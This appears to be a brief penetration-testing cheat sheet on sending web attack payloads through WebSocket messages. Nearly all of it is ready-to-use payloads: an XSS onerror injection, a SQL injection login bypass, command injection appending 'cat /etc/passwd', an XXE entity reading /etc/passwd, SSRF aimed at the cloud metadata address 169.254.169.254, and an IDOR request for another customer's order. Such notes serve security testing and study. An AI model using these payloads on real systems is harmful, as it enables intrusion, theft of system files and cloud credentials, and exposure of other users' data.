# exploit and chain
## Manipulating WebSocket messages

```json
{"message":"<img src=1 onerror='alert(1)'>"}
```
The same payloads you'd use in POST data or URL parameters can often be sent through WebSocket messages with the same impact. The only difference is the transport layer - the vulnerabilities themselves work exactly the same way.

### **SQL Injection:**

```json
{
  "username": "admin' OR '1'='1' -- ",
  "password": "anything"
}
```

### **Command Injection:**

```json
{
  "command": "ping 127.0.0.1 && cat /etc/passwd"
}
```

###  **XXE - File Reading:**

```json
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]><message><user>&xxe;</user><content>test</content></message>
```

  
### **XSS (Cross-Site Scripting):**

```json
{
  "message": "<img src=0 onerror=alert(1)>"
}
```

### **Server-Side Request Forgery (SSRF):**

```json
{
  "url": "<http://169.254.169.254/latest/meta-data/>",
  "action": "fetch_url"
}
```

### **Insecure Direct Object Reference (IDOR) :**

```json
// View your own order
{
  "request": "order_details",
  "order_id": "1001"
}

// IDOR - view someone else's order with sensitive info
{
  "request": "order_details",
  "order_id": "1002"  // Another customer's order
}
```
